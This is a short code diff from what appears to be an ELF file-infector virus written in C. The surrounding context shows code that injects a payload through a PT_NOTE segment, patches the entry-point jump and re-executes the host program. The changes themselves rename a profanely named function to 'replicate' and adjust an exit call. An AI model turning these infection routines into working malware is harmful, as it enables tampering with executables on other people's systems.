@@ -34,7 +34,7 @@ static void replicate_on_memory(const struct s_info *info, char *ptr)
 	_memcpy(ptr + info->note->p_offset + (JMP_OFFSET - sizeof(JMP_OPCODE)), &entry_point, sizeof(int));
 }
 
-static void fuck_you(const struct s_info *info)
+static void replicate(const struct s_info *info)
 {
 	pid_t child;
 	char *av[] = {info->name, NULL};
@@ -48,7 +48,7 @@ static void fuck_you(const struct s_info *info)
 		_close(STDERR_FILENO);
 
 		_execve(av[0], av, NULL);
-		Exit(42);
+		_fatal(42);
 	}
 }
 
@@ -71,6 +71,7 @@ void inject(struct s_info *info)
 	_write(info->fd, ptr, file_size);
 	_munmap(ptr, file_size);
 	release_info(info);
+
 #if DEBUG
 	char name[] = "/tmp/trace";
 	int fd = _open(name, O_RDWR | O_APPEND, 0000);
@@ -84,5 +85,5 @@ void inject(struct s_info *info)
 	_close(fd);
 #endif
 
-	fuck_you(info);
+	replicate(info);
 }
